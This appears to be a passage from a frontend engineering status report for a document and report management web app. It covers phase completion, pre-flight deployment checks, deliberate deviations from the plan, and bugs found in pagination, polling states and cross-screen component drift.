1. **`trust proxy` end-to-end.** Log in from two different networks; assert the `auth.login_success` audit rows carry different `ipAddress` values. If they match, rate limiting and the compliance trail are both broken and no frontend work fixes it.
2. **A real 24 MiB PDF through the deployed rewrite.** If the platform caps below 25 MiB, the topology decision reopens — and that invalidates `connect-src 'self'`, the same-site cookie story, and the CSP.
3. **Two tabs, refresh in one, confirm the other survives.** The acceptance test for the session-rotation finding, and the difference between a working app and one that logs people out every five minutes.

| Phase | Delivers | Gate |
|---|---|---|
| 0 ✅ | PRD v1.3, `instructions.md` Section 0 cleanup, seed CMPDI fix, `trust proxy` hop count | Done — 389/389 green. Pre-flight checks 1–2 still outstanding. |
| 1 ✅ | Scaffold, env, Tailwind §6 tokens + `--color-success`, CSP nonce, rewrites, CI job, brand SVGs + favicon set + manifest + OG image | Done — lint/typecheck/build/audit clean, nonce verified matching on a live response. shadcn/ui deferred to Phase 2, where the first real components appear. |
| 2 ✅ | Auth spine: tokenStore, rawFetch/apiFetch split, single-flight + Web Locks + BroadcastChannel refresh, AuthProvider, RequireAuth/RequireRole, login, invite accept, sessions, dashboard, 404 | Done — 21 tests, lint/typecheck/build/audit clean. Session-rotation behaviour verified against the live backend (see below). |
| 3 ✅ | Documents: cursor list, filters, upload with progress, detail poller, extracted-field table, override, retry, text panel | Done |
| 4 ✅ | Reports: offset list, template picker, structured section editor, version history, publish/archive + admin panel | Done |
| 5 ✅ | AI query + citations; topics word cloud + trends; analytics; audit viewer | Done |
| 6 ✅ | Public pages (home, About, Contact, Privacy), shared marketing layout, responsive shell, a11y pass | Done |

Phase 2 was the risk concentration — the auth spine is where a mistake logs every user out. Phases 3–6 were repetitions of a pattern proven in Phase 2, and that held: no change to the auth spine was needed to build any of them.

### What Phases 3–6 actually shipped

20 routes, 10 feature modules, 16 shared components, 24 feature components, ~23 300 lines of TS/TSX, 64 tests. `lint`, `tsc --noEmit`, `vitest`, `next build` and `npm audit --audit-level=high` all clean, and the build output still reports `ƒ Proxy (Middleware)`.

Verified against a running production build, not just a compile: every route renders and `/nope` 404s; the CSP is present on the HTML document, carries no `unsafe-eval` and no bare `unsafe-inline` in `script-src`, and the header nonce **matches all 15 nonce attributes in the HTML** — the check §Two Next 16 conventions warns is invisible to a headless browser.

**One route beyond the §5 table was added for a second reason.** `POST /report-templates` had no caller anywhere in the frontend, so templates could only ever come from the seed script — and every report is stamped from one. `/admin/templates` closes that. It lists and creates only: the API has no PATCH and no DELETE for templates and hardcodes `version` to 1, so the screen deliberately offers no edit control for an operation that does not exist. Its size meter counts BYTES rather than characters, because the binding limit is `express.json({ limit: '10kb' })` app-wide rather than `SECTION_LIMITS.bodyMax`, and a section in Devanagari is three bytes per character.

**Four deviations from this plan, each deliberate:**

1. **`react-hook-form`, `dompurify` and `date-fns` were not installed**, though the dependency table names them. Phases 1–2 had already solved each problem without them — forms are hand-rolled over the `Field` primitives, `src/lib/datetime.ts` uses `Intl` (and the fixed IST offset makes a date library unnecessary), and the "render everything as React text nodes" rule means the app ships zero `dangerouslySetInnerHTML`, which leaves DOMPurify with nothing to sanitise. Adding all three would have been unused surface on an `npm audit --audit-level=high` CI gate. `recharts` and `@visx/wordcloud` WERE installed, as specified.

2. **An `/analytics` screen was added.** The §5 screen table has no entry for it, but `GET /analytics` is a rich endpoint — KPI aggregates, per-status breakdowns, an optional by-subsidiary split — and leaving it unconsumed would have meant the frontend did not cover the API.

3. **Charts do not use the §6 palette for series.** Fed to a validator as a categorical series palette the §6 tokens fail outright: `--color-primary-dark` sits below both the lightness band and the chroma floor (it reads grey beside a real hue) and `--color-success` is too dark. Series therefore use their own validated ramp, led by SIH Blue so charts still read as part of the product. See `src/components/charts/palette.ts`.

   The finding worth recording: **checked across every pair, no palette of more than two hues is colour-blind-safe** — to a protanope green and orange are the same colour (ΔE 2.3), to a deuteranope blue and purple are the same colour (ΔE 1.3). That is a property of vision, not of the palette, and no reordering fixes it. So every multi-series chart carries a marker shape and dash pattern as well as a hue, a legend is always present, and series are capped at six with the tail folded into "Other". §6's contrast rule does not cover this, which is exactly why it needed checking rather than eyeballing.

4. **`document.status === 'failed'` is a poll-stop but not a terminal state**, and the same distinction applies to queries. This is not in the PRD and was found by reading the workers: a client that polls until `answered` hangs forever on a failed row, and one that treats `failed` as terminal offers no retry where the server would accept one. `isQueryPending` / `isQueryTerminal` are deliberately different predicates for this reason, and both are pinned by tests.

### Corrections this work made to the plan's own assumptions

- **`QueryStatus` has seven values, not five.** The plan's §5.7 note lists `queued, answered, unsupported, failed, dead_lettered`; the model also emits `retrieving` and `answering`. A UI that knows only `queued` renders an unlabelled row for most of a query's life.
- **A cursor page can come back EMPTY with `nextCursor` still set.** All three cursor lists originally hid their "Load more" control at zero rows, which strands the reader on an empty screen with results one request away. `nextCursor === null` is the only end-of-list signal — a short page is not one, and neither is an empty one.
- **Refreshing a cursor list must RESET it, not refetch it.** `refetch()` re-requests every loaded page while replaying the cursors it captured, and those cursors have moved: new rows land at the head, so a refreshed first page ends short of the boundary page two still asks for and the rows in between vanish from the merged list.
- **Reprocessing a document can leave two extracted-field rows with the same `fieldName`** — the worker deletes only the non-overridden rows and re-inserts the full fresh set, so a human-corrected field survives alongside a new machine one. Keying a list on `fieldName` silently drops one.

### The defect class that only a cross-screen review found

Each screen was reviewed on its own before a final pass read *across* all of them. The single-screen
reviews caught plenty; what only the cross-screen pass could see was this:

**Phase 2's screens were never migrated onto the component library Phase 3 introduced.** The
dashboard, the sessions screen and both auth screens were written before `components/ui` existed, so
they hand-rolled what later became shared primitives — and the copies had since DRIFTED. The
dashboard's own report-status pill gave `draft` the app's `warning` yellow where the shared map gives
it `neutral`, so the same report was described two different ways on two screens, and it was the only
status marker in the app carrying meaning by colour alone. The same screens skipped the
loading/error/retry vocabulary entirely: the dashboard was the one recoverable error in the app with
no "Try again", and its loading state was silent to a screen reader.

The lesson is worth keeping: **a component library extracted midway through a project does not
retroactively apply itself**, and the screens most likely to be left behind are the earliest ones —
which are also the ones users see first. A per-screen review cannot catch this, because each screen
is internally consistent; only comparing them reveals it.

Two other cross-cutting finds in the same class: `fetchDocumentBlob` was the only one of the app's
three network paths with no 401 handling, so a preview attempted with an expired token failed outright
while every other request recovered silently; and `useRetryDocument` invalidated a key PREFIX that
also matched the nested chunk and extracted-field queries, refetching them at the instant the document
still read `failed` and caching an empty array — chunks for a full five minutes.

### Still outstanding

Pre-flight checks 1 and 2 from this section — the `trust proxy` hop count end-to-end, and a real 24 MiB PDF through the deployed rewrite — remain unverified. Both need a deployed environment rather than a local build, and check 2 can still reopen the topology decision. Check 3 (multi-tab session survival) was verified against the live backend during Phase 2.
